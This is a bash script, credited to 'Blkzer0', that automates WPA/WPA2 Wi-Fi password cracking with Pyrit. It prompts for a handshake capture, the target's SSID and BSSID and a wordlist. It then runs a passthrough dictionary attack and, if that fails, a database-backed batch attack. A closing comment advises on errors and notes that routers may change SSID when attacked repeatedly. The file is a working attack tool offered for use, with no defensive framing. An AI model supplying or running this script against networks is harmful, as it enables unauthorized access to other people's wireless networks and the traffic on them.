#!/bin/bash
#Automated WPA/2 Cracking using Pyrit, for the lazy. Version 1.0. Written by Blkzer0. Hooray!!.

method2(){
#this will clean the capture file
pyrit -r $cap analyze
sleep 1
pyrit -e $ssid create_essid
pyrit -i $list import_passwords
sleep 3
#after flushing is complete
pyrit eval #(passwords avaliable)
sleep 1
pyrit batch #(after its done)
sleep 1
pyrit eval #(it should say 100% passwords)
sleep 1
pyrit -r $cap attack_db
#password should output if its found
}

method1(){
pyrit -r $cap analyze
pyrit -r $cap -i $list -b $mac attack_passthrough
read -p "Do you want to try method 2 if password was not found?" choice
if [ $choice == "y" ]; then
method2
elif [ $choice == "n" ]; then
exit
fi
}

echo "Cracking with Pyrit....."
sleep 1
read -p " Provide Path to Capture file (.pcap/.cap):>" cap
read -p " Provide ssid (name) of target?>" ssid
read -p " Provide bssid (mac) of target?>" mac
read -p " Provide path to wordlist:>" list
echo "--------------------------------------------------"
pyrit list_cores
sleep 2
echo " Starting Pyrit..."
sleep 3
method1

#Sometime in method2 you will get a error saying "No suitable AccessPoint with that ESSID in the capture file". Make sure you check the name of the ssid, if it has capital letters, than you must also input with capital letters. Its really weird but sometimes the router may change the ssid of the AP if you attack it too much.
